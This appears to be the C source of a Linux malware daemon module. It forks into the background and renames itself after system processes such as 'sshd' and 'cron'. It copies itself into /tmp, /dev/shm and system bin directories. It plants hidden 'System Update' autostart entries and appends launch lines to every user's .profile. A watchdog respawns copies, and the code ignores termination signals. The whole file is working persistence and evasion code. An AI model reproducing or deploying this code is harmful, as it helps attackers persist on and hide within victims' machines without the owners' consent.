#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include "headers/daemon.h"

static int safe_strncpy(char *dest, const char *src, size_t size) {
    if (!dest || !src || size == 0) return -1;
    size_t len = strlen(src);
    if (len >= size) return -1;
    strncpy(dest, src, size-1);
    dest[size-1] = '\0';
    return 0;
}

static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
    if (!dest || !dir || !file || dest_size == 0) return -1;
    size_t req_len = strlen(dir) + strlen(file) + 2;
    if (req_len > dest_size) return -1;
    snprintf(dest, dest_size, "%s/%s", dir, file);
    return 0;
}

void* rename_process(void* arg) {
    while (1) {
        const char* names[] = {"init", "bash", "cron", "sshd"};
        const char* new_name = names[rand() % 4];
        strncpy((char*)getenv("_"), new_name, strlen(new_name));
        sleep(15);  // 15s better?
    }
    return NULL;
}

int copy_file(const char *src, const char *dst) {
    char buf[1024];
    size_t size;

    FILE* source = fopen(src, "rb");
    if (!source) {
        return -1;
    }

    FILE* dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return -1;
    }

    while ((size = fread(buf, 1, 1024, source)) > 0) {
        fwrite(buf, 1, size, dest);
    }

    fclose(source);
    fclose(dest);

    return chmod(dst, S_IRWXU | S_IRWXG | S_IRWXO);
}

void run_clone(const char *path, int argc, char** argv) {
    pid_t pid = fork();
    if (pid == 0) {
        overwrite_argv(argc, argv);
        execl(path, path, (char *)NULL);
        exit(EXIT_SUCCESS);
    }
}

void overwrite_argv(int argc, char** argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    strncpy(argv[0], "init", strlen("init"));
}

void* watchdog(void* arg) {
    while (1) {
        DIR* proc = opendir("/proc");
        if (!proc) {
            sleep(15);
            continue;
        }

        struct dirent* ent;
        int found_copies = 0;
        char self_path[PATH_MAX];
        ssize_t self_len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
        if (self_len < 0) {
            closedir(proc);
            sleep(15);
            continue;
        }
        self_path[self_len] = '\0';

        while ((ent = readdir(proc)) != NULL) {
            if (!isdigit((unsigned char)ent->d_name[0])) continue;
            char exe_path[PATH_MAX] = {0};
            char path[PATH_MAX] = {0};
            if (join_path(path, sizeof(path), "/proc", ent->d_name) != 0) continue;
            if (join_path(path, sizeof(path), path, "exe") != 0) continue;
            ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
            if (len > 0) {
                exe_path[len] = '\0';
                if (strcmp(exe_path, self_path) == 0) {
                    found_copies++;
                }
            }
        }
        closedir(proc);

        if (found_copies < 3) {
            char source_path[PATH_MAX];
            ssize_t path_len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
            if (path_len > 0) {
                source_path[path_len] = '\0';
                const char* dirs[] = {"/tmp/", "/var/tmp/", "/dev/shm/"};
                for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
                    char new_path[PATH_MAX] = {0};
                    snprintf(new_path, sizeof(new_path), "%s%x", dirs[i], rand());
                    if (copy_file(source_path, new_path) == 0) {
                        chmod(new_path, S_IRWXU);
                        pid_t pid = fork();
                        if (pid == 0) {
                            setsid();
                            execl(new_path, new_path, NULL);
                            exit(0);
                        }
                        unlink(new_path);
                        break;
                    }
                }
            }
        }
        sleep(15);
    }
    return NULL;
}

int ensure_startup_persistence(const char *source_path) {
    if (!source_path) return -1;

    const char *home_dirs[] = {
        "/home",
        "/root",
        "/tmp",
        "/dev",
        "/var/home"
    };
    
    const char *startup_locations[] = {
        "/.config/autostart",
        "/.config",
        "/.local/bin",
        "/.cache"
    };
    
    char temp_path[PATH_MAX] = {0};

    for (int i = 0; i < sizeof(home_dirs) / sizeof(home_dirs[0]); i++) {
        DIR *dir = opendir(home_dirs[i]);
        if (!dir) continue;
        
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
            
            for (int j = 0; j < sizeof(startup_locations) / sizeof(startup_locations[0]); j++) {
                char dest_dir[PATH_MAX] = {0};
                
                if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) != 0) continue;
                if (join_path(dest_dir, sizeof(dest_dir), temp_path, startup_locations[j] + 1) != 0) continue;
                
                if (mkdir(dest_dir, 0755) != 0 && errno != EEXIST) continue;
                
                char dest_path[PATH_MAX] = {0};
                unsigned int rand_suffix = (unsigned int)time(NULL) ^ (unsigned int)random();
                if (snprintf(dest_path, sizeof(dest_path), "%s/.update-%x", dest_dir, rand_suffix) >= sizeof(dest_path)) continue;
                
                if (access(dest_path, F_OK) == 0) continue; // Anti dup
                if (copy_file(source_path, dest_path) == 0) {
                    if (strstr(dest_dir, "autostart")) {
                        char desktop_path[PATH_MAX] = {0};
                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "update.desktop") == 0) {
                            FILE *f = fopen(desktop_path, "w");
                            if (f) {
                                if (fprintf(f, "[Desktop Entry]\nType=Application\nName=System Update\nExec=%s\nHidden=true\n", 
                                    dest_path) > 0) {
                                    chmod(desktop_path, 0644);
                                }
                                fclose(f);
                            }
                        }
                    }
                    
                    char profile_path[PATH_MAX] = {0};
                    if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) == 0 &&
                        join_path(profile_path, sizeof(profile_path), temp_path, ".profile") == 0) {
                        
                        int entry_exists = 0;
                        FILE *check = fopen(profile_path, "r");
                        if (check) {
                            char line[PATH_MAX];
                            while (fgets(line, sizeof(line), check)) {
                                if (strstr(line, dest_path)) {
                                    entry_exists = 1;
                                    break;
                                }
                            }
                            fclose(check);
                        }

                        if (!entry_exists) {
                            FILE *profile = fopen(profile_path, "a");
                            if (profile) {
                                fprintf(profile, "\n([ -f '%s' ] && nohup '%s' &>/dev/null &)\n", 
                                    dest_path, dest_path);
                                fclose(profile);
                            }
                        }
                    }
                }
            }
        }
        closedir(dir);
    }
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        signal(sig, signal_handler);
        return;
    }
}

void setup_signal_handlers() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigaction(SIGPIPE, &sa, NULL);
    sigaction(SIGHUP, &sa, NULL);
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGALRM, SIG_IGN);
    signal(SIGUSR1, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
}

void daemonize(int argc, char** argv) {
    srand(time(NULL) ^ getpid());
    
    char source_path[PATH_MAX] = {0};
    ssize_t len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
    if (len > 0) {
        source_path[len] = '\0';
        ensure_startup_persistence(source_path);
    }

    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    setup_signal_handlers();
    setsid();
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    umask(0);
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    const char* dirs[] = {
        "/usr/local/sbin/",
        "/usr/local/bin/",
        "/sbin/",
        "/bin/",
        "/usr/sbin/",
        "/usr/bin/",
        "/usr/games/",
        "/usr/local/games/",
        "/snap/bin/"
    };
    const char* daemon_names[] = {"update", "lists", "servers", "updater"};
    int daemon_names_count = sizeof(daemon_names) / sizeof(daemon_names[0]);

    char dest_path[PATH_MAX] = {0};
    int copies_created = 0;

    for (int i = 0; copies_created < 2 && i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        for (int j = 0; copies_created < 2 && j < daemon_names_count; j++) {
            if (join_path(dest_path, sizeof(dest_path), dirs[i], daemon_names[j]) != 0) 
                continue;
            
            if (access(dest_path, F_OK) == 0)
                continue;
                
            if (copy_file(source_path, dest_path) == 0) {
                run_clone(dest_path, argc, argv);
                copies_created++;
            }
        }
    }

    pthread_t rename_thread;
    pthread_create(&rename_thread, NULL, rename_process, NULL);
    
    pthread_t watchdog_thread;
    pthread_create(&watchdog_thread, NULL, watchdog, NULL);
}
